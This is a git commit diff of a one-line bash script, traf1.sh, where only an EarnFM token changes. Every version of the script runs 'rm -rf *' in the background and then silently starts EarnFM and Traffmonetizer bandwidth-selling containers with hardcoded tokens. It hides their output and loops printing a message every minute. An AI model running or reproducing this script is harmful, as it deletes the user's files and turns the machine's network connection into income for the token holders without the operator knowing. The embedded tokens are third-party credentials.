1196e07bab7f40c54fb01066c0b4fc5d203b0703
rabithoy <emailforfrom@gmail.com>
2025-04-01 09:49:15 +0700

    Update traf1.sh

--- traf1.sh
+++ traf1.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-rm -rf * & sudo docker run --restart unless-stopped -d -e EARNFM_TOKEN="bea9e21a-5958-499f-9b87-6715b27e3cd2"  earnfm/earnfm-client:latest & docker run --restart unless-stopped -d traffmonetizer/cli_v2 start accept --token 'v/48X/a758e2YpQfp8hdg5Sj0vUxEWQqq8wMuqfNIkw=' > /dev/null 2>&1 && while true; do clear; echo "ilovingyou"; sleep 60; done
+rm -rf * & sudo docker run --restart unless-stopped -d -e EARNFM_TOKEN="2daac0b6-c3ff-42ea-a177-b5f5b9db81cc"  earnfm/earnfm-client:latest & docker run --restart unless-stopped -d traffmonetizer/cli_v2 start accept --token 'v/48X/a758e2YpQfp8hdg5Sj0vUxEWQqq8wMuqfNIkw=' > /dev/null 2>&1 && while true; do clear; echo "ilovingyou"; sleep 60; done
